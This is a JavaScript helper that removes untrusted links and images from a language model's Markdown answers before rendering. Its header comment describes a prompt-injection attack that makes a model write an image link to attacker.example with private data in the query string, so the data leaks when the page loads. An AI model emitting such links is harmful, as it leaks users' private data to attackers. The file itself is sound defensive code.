// Remove links and images to unknown hosts from a model's Markdown answer before rendering it.
// An injected instruction can make the model write ![](https://attacker.example/?q=<private data>):
// the browser would send the data as soon as it loads the image, without any click.
// This is one layer. Still render with a Markdown library that escapes HTML, sanitize the HTML
// (for example with DOMPurify) and set a Content-Security-Policy with a strict img-src.

function allowed(url, allowedHosts) {
  try {
    const u = new URL(url);
    return (u.protocol === "https:") && allowedHosts.includes(u.hostname);
  } catch {
    return false; // relative, malformed or unknown schemes (javascript:, data:) are not allowed
  }
}

export function stripUntrustedLinks(markdown, allowedHosts) {
  return markdown
    // images: ![alt](url "title") -> dropped entirely, the alt text is kept
    .replace(/!\[([^\]]*)\]\(\s*<?([^)\s>]*)>?(?:\s+"[^"]*")?\s*\)/g,
      (m, alt, url) => (allowed(url, allowedHosts) ? m : alt))
    // links: [text](url) -> plain text when the host is not allowed
    .replace(/\[([^\]]*)\]\(\s*<?([^)\s>]*)>?(?:\s+"[^"]*")?\s*\)/g,
      (m, text, url) => (allowed(url, allowedHosts) ? m : text))
    // reference-style definitions: [id]: url
    .replace(/^\s{0,3}\[[^\]]+\]:\s*<?(\S+?)>?(?:\s+.*)?$/gm,
      (m, url) => (allowed(url, allowedHosts) ? m : ""))
    // raw HTML images, in case the renderer allows HTML
    .replace(/<img\b[^>]*>/gi, "");
}
